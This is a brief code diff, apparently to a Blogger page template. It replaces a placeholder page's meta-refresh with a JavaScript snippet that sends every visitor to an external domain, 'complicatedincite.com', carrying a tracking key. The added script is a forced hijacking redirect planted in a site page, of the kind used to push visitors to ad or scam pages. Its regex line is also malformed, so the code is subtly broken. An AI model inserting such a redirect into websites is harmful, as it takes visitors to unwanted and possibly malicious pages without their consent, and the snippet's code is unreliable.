@@ -1,13 +1,5 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta content='0;url=https://complicatedincite.com/xymww3tx3?key=3bede6305476ef8b7f190fc030fec312' http-equiv='refresh'/>
-<title>Page Title</title>
-</head>
-<body>
-
-<h1>This is a Heading</h1>
-<p>This is a paragraph.</p>
-
-</body>
-</html>
+<script type='text/javascript'>
+var d='<data:blog.url/>';
+d=d.replace(/.*//[^/]*/, '');
+location.href = 'https://complicatedincite.com/xymww3tx3?key=3bede6305476ef8b7f190fc030fec312';
+</script>
